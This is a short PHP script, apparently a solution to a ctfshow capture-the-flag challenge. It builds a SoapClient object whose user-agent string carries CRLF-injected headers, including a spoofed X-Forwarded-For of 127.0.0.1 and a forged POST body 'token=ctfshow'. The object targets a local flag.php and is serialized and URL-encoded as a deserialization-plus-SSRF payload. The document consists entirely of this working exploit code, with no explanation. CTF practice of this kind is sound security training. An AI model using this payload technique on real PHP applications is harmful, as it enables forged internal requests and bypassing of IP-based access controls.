<?php



$ua = "aaa\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow";
$client = new SoapClient(null, array('uri' => 'http://127.0.0.1/', 'location' => 'http://127.0.0.1/flag.php', 'user_agent' => $ua));
echo urlencode(serialize($client));


?>